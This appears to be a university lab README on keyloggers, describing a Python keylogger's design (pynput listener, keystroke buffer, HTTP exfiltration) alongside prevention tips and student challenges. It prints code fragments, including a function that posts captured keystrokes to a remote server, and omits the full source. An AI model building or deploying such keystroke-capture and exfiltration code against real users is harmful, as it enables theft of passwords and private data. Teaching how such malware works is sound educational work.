# 🛡️ Keylogger Laboratory – Cybersecurity

![Cybersecurity Banner]([https://images.unsplash.com/photo-1550751827-4bd374c3f58b](https://github.com/Samucahub/Portfolio/blob/main/Keylogger/Images/keylogger.png))

> **Academic Cybersecurity Laboratory – ISTEC Porto (2024/2025)**
> This repository documents a practical cybersecurity laboratory focused on understanding, developing, and mitigating **keyloggers** using **Python**.

---

## 📌 Table of Contents

1. [Overview](#-overview)
2. [What is a Keylogger?](#-what-is-a-keylogger)
3. [Python & Malware Development](#-python--malware-development)
4. [Keylogger Architecture](#-keylogger-architecture)
5. [Code Walkthrough](#-code-walkthrough)
6. [Full Source Code](#-full-source-code)
7. [How to Prevent Keyloggers](#-how-to-prevent-keyloggers)
8. [Conclusion](#-conclusion)
9. [Practical Challenges](#-practical-challenges)

---

## 🔍 Overview

The goal of this laboratory is to introduce students to **key concepts of cybersecurity** related to the capture of sensitive data using **keyloggers**.

Through hands-on practice, students:

* Understand how keyloggers work
* Learn how attackers capture keystrokes
* Analyze the risks posed to users and systems
* Explore detection and mitigation techniques

⚠️ Ethical and legal implications are emphasized throughout the project.

---

## ⌨️ What is a Keylogger?

A **keylogger** is a type of software or hardware designed to **record keystrokes** made by a user.

Captured data may include:

* Passwords
* Private messages
* Banking details

🔐 While often used maliciously, keyloggers may also be legally employed for:

* Corporate monitoring
* Educational environments

Due to their stealthy nature, keyloggers represent a **serious threat** to privacy and information security.

---

## 🐍 Python & Malware Development

Python was chosen for this laboratory because it is:

* Easy to learn
* Extremely versatile
* Suitable for rapid prototyping

Python provides powerful libraries that allow:

* Keyboard input capture
* HTTP communication
* File manipulation

It is also **cross-platform** and can be compiled into executables, making it ideal for cybersecurity simulations.

---

## 🧠 Keylogger Architecture

![Architecture Diagram](https://raw.githubusercontent.com/github/explore/main/topics/python/python.png)

The developed keylogger consists of:

* Keyboard event listeners
* A buffer system for batching keystrokes
* Remote data exfiltration via HTTP
* Key state tracking (Caps Lock, Shift, Backspace)

---

## 🧩 Code Walkthrough

### 1️⃣ Importing Libraries

```python
import requests
from pynput import keyboard
```

* `requests` → sends captured data to a remote server
* `pynput.keyboard` → listens to keyboard events

---

### 2️⃣ Global Variables

```python
buffer = ''
caps_lock_on = False
pressed_keys = set()
backspace_count = 0
```

These variables manage the internal state of the keylogger.

---

### 3️⃣ Sending Captured Data

```python
def send_buffer(data):
    requests.post(SERVER_URL, data={'log': data})
```

Sends keystroke data to the server securely via HTTP.

---

### 4️⃣ Processing Key Presses

* Detects Caps Lock changes
* Handles printable characters
* Tracks special keys (Enter, Space, Backspace)
* Avoids duplicated input

When the buffer reaches **20 characters**, it is automatically sent.

---

### 5️⃣ Key Release Handling

```python
if key == keyboard.Key.esc:
    return False
```

Pressing **ESC** safely stops the keylogger.

---

## 📜 Full Source Code

```python
# (Full code exactly as implemented in the laboratory)
# See project files for the complete implementation
```

> 📂 The full script is included in this repository for educational purposes only.

---

## 🛑 How to Prevent Keyloggers

To protect systems against keyloggers:

* ✅ Keep antivirus software updated
* 🔄 Update OS and applications regularly
* 📧 Avoid suspicious links and attachments
* 🔐 Enable two-factor authentication
* 🧯 Use firewalls to monitor outbound traffic
* 👀 Monitor running processes
* ❗ Be cautious with app permissions

---

## 🧾 Conclusion

This laboratory provided a **practical and ethical approach** to understanding keyloggers.

Students gained:

* Technical insight into malware behavior
* Awareness of privacy and legal concerns
* Skills to detect and mitigate threats

The activity reinforced both **programming** and **cybersecurity defense** concepts.

---

## 🧪 Practical Challenges

| Level     | Task                                      |
| --------- | ----------------------------------------- |
| 🟢 Easy   | Detect if a keylogger is running          |
| 🟡 Medium | Log suspicious processes with date & time |
| 🔴 Hard   | Develop a local keylogger                 |

---

## 🎓 Institution

**ISTEC Porto**
Institute of Advanced Technologies of Porto
Cybersecurity Laboratory – June 2025

---

> ⚠️ **Disclaimer:** This project is for **educational purposes only**. Any misuse of this code is strictly discouraged.

